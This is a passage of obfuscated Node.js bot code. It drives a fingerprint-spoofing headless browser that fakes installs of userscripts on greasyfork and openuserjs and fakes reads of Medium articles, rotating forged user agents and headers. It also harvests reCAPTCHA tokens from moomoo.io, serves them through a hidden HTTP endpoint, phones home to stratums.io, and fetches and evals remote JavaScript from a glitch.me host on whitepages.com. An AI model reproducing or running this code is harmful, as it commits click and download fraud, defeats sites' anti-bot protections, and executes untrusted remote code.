      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + X(0xb),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + X(0x8),
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    W(0x1) + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + X(0xe) + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + Y(0x15, 'LjVa') + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + Y(0x18, ']Exk') + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1300 + -0x1 * 0x1bd9 + -0x3 * -0x2f3
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x5a7 * -0x2 + -0x47 * 0x15 + -0x57b)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x148a + -0x1dc6 + 0x9a0), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x1 * 0x832 + 0x2f * 0xd + -0xa31 * 0x1), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x40 * -0x65 + 0x2363 + -0x13 * 0x331;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x14dd + -0x93 * 0x1f + -0x310; w < getRandomInt(-0x1122 + 0x1 * 0x577 + -0xa6 * -0x12, -0x11e * 0x22 + -0x21a1 + 0x35 * 0x15a); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x145d7 + 0x2263 * -0x7 + 0x320ec);
        }
      }();
    }, 0x242c * -0x1 + -0x2430 + -0x6 * -0xc20), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const Z = d;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x1 * 0x2312 + 0xee0 + 0x1432;
      const x = await v[Z(0x11)]();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x20f2 + -0x1426 + -0xccc, -0x1 * -0x347 + -0x14b8 + 0x285 * 0x7)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0xd * -0x8b + 0xe6c8 + -0x3 * 0x2383);
    }, -0x19e0 + 0x1eb * 0x7 + 0xcd7), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x2200 + 0x158 * 0x2 + -0x24b0;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1d86 + -0x208d + 0x1 * 0xebf), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x18e0 + 0x1fc4 + -0x6e4), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xfca * 0x1aa + -0x3 * -0x5a957 + 0x7449 * -0x41);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0xa58 + -0x1c1 * -0x3 + 0x579);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x269 * -0xf + 0xa * 0x10a + 0x1a8b);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x2513 * 0x1 + 0x3014 + 0x3597 * -0x1);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = c,
    a2 = b;
  async function f() {
    const a1 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0xbb + -0x23a8 + -0x22 * -0x107) {
        const a0 = b;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' [a0(0x9, 'vac(')] + (-0x11d + -0x2 * -0xde7 + -0x1ab0));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1 * 0x9fd + -0x1cab * 0x1 + -0x4 * -0x9aa, D['indexOf']('\x20'));
        return B ? E['slice'](-0x3b9 * -0x3 + 0xa * 0xe2 + -0x13ff, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x2571 + -0x2 * -0x16b2 + 0x19f * -0x1b),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + a1(0x0) + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x3087 * -0x1 + 0x1c8a + -0x3 * 0xcab),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      a2(0xd, '#tOr') + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + a3(0x4) + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x6d9 * 0x5 + -0x2 * -0x36d + -0x2917; k < -0xdc9 + -0x1 * -0x2465 + -0x1698; k++)
    setTimeout(f, (-0x1bcff + -0x5ac * -0xd + 0x1e3 * 0x141) * k * getRandomInt(-0xdd5 * 0x1 + -0x1f21 + -0x4ff * -0x9, 0x1eb4 + 0xc7a + -0x2b2b));
  setInterval(() => {
    f();
    for (let l = 0x3 * -0xbe7 + 0x3e9 * 0x3 + -0x42 * -0x5d; l < 0x7d8 + -0x4a * -0x53 + -0x1fd2; l++)
